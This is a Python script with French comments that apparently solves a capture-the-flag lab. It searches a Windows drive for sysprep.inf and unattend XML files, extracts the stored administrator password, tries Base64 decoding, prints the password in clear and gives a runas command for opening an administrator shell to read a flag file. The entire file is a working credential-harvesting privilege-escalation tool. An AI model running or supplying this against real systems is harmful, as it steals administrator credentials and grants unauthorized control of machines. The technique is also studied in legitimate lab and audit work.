#!/usr/bin/env python3
"""
Privilege Escalation via Windows Unattended Installation Files

- Recherche sysprep.inf, autounattend.xml, Unattend.xml
- Extrait <AdministratorPassword><Value>...</Value> ou AdminPassword=...
- Tente de décoder le mot de passe (Base64 si possible)
- Fournit la commande runas à utiliser avec le mot de passe extrait
- Logue toutes les étapes dans results.md

Aucun mot de passe n'est hardcodé dans le script : il provient uniquement des fichiers unattended.
"""

import os
import re
import base64
from datetime import datetime

# -----------------------------
# Configuration de base
# -----------------------------

TARGET_FILENAMES = [
    "sysprep.inf",
    "autounattend.xml",
    "Unattend.xml",
]

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_PATH = os.path.join(BASE_DIR, "results.md")


def log(message: str) -> None:
    """Écrit un message horodaté dans results.md et l'affiche à l'écran."""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {message}"
    print(line)
    with open(RESULTS_PATH, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def init_results_file() -> None:
    """Initialise le fichier results.md."""
    with open(RESULTS_PATH, "w", encoding="utf-8") as f:
        f.write("## Unattended Files PrivEsc Results\n")
        f.write(f"Date: {datetime.now()}\n\n")


def try_decode_password(raw_password: str) -> str:
    """
    Tente de décoder le mot de passe si encodé (ex : Base64).
    Si échec, retourne la valeur brute.
    """
    log("Tentative de décodage du mot de passe (si encodé).")

    # Heuristique simple : ressemble à du Base64 ?
    if re.fullmatch(r"[A-Za-z0-9+/=]+", raw_password.strip()):
        try:
            decoded_bytes = base64.b64decode(raw_password.strip())
            decoded = decoded_bytes.decode("utf-8", errors="ignore")
            if decoded.strip():
                log("Décodage Base64 réussi.")
                return decoded.strip()
        except Exception as e:
            log(f"Décodage Base64 échoué : {e}")

    log("Aucun décodage appliqué, utilisation de la valeur brute.")
    return raw_password.strip()


def find_unattend_files(start_path: str = "C:\\") -> list:
    """Recherche récursivement les fichiers unattended à partir de start_path."""
    log(f"Recherche des fichiers unattended à partir de {start_path} ...")
    found = []
    for root, dirs, files in os.walk(start_path):
        # Éviter certains dossiers très bruyants si besoin (optionnel)
        # dirs[:] = [d for d in dirs if d.lower() not in ["windows.old"]]
        for name in files:
            if name in TARGET_FILENAMES:
                full_path = os.path.join(root, name)
                found.append(full_path)
                log(f"Fichier trouvé : {full_path}")
    if not found:
        log("Aucun fichier unattended trouvé.")
    return found


def extract_admin_password(file_path: str) -> str | None:
    """
    Extrait le mot de passe Administrateur depuis un fichier unattended.
    - XML : <AdministratorPassword><Value>...</Value>
    - INF : AdminPassword=...
    """
    log(f"Analyse du fichier : {file_path}")
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        log(f"Erreur de lecture du fichier {file_path} : {e}")
        return None

    # Cas XML
    xml_match = re.search(
        r"<AdministratorPassword>.*?<Value>(.*?)</Value>",
        content,
        flags=re.IGNORECASE | re.DOTALL,
    )
    if xml_match:
        value = xml_match.group(1).strip()
        log("Mot de passe Administrateur trouvé (balise XML).")
        return value

    # Cas INF
    inf_match = re.search(
        r"AdminPassword\s*=\s*(.+)",
        content,
        flags=re.IGNORECASE,
    )
    if inf_match:
        value = inf_match.group(1).strip()
        log("Mot de passe Administrateur trouvé (format INF).")
        return value

    log("Aucun mot de passe Administrateur trouvé dans ce fichier.")
    return None


def main() -> None:
    init_results_file()
    log("Démarrage du script d'escalade de privilèges via fichiers unattended.")

    # 1) Recherche des fichiers unattended
    files = find_unattend_files("C:\\")
    if not files:
        log("Fin du script : aucun fichier unattended détecté.")
        return

    # 2) Extraction du mot de passe Administrateur
    admin_password_raw = None
    source_file = None

    for path in files:
        pwd = extract_admin_password(path)
        if pwd:
            admin_password_raw = pwd
            source_file = path
            break

    if not admin_password_raw:
        log("Fin du script : aucun mot de passe Administrateur trouvé.")
        return

    log(f"Mot de passe Administrateur extrait depuis : {source_file}")
    log("Le mot de passe ne sera pas écrit en clair dans results.md pour limiter l'exposition.")

    # 3) Décodage éventuel
    admin_password_decoded = try_decode_password(admin_password_raw)

    # 4) Préparation de la session Admin (runas)
    admin_user = "Administrator"  # adapter si le compte a un autre nom
    flag_path = r"C:\Users\Administrator\Desktop\flag.txt"

    log(f"Compte Administrateur supposé : {admin_user}")
    log(f"Emplacement supposé du flag : {flag_path}")

    log("Pour ouvrir une session Administrateur avec runas, utilise la commande suivante :")
    print()
    print(f'    runas /user:{admin_user} "cmd.exe"')
    print()
    log("Le mot de passe extrait sera affiché ci-dessous pour que tu puisses le saisir dans runas.")
    print("------------------------------------------------------------")
    print("Mot de passe Administrateur (extrait des fichiers unattended) :")
    print(admin_password_decoded)
    print("------------------------------------------------------------")
    log("Mot de passe affiché à l'écran pour utilisation manuelle avec runas (non logué en clair).")

    log("Une fois la session Admin ouverte, exécute par exemple :")
    log(f'    type "{flag_path}"')
    log("Fin du script (phase automatisée).")


if __name__ == "__main__":
    main()
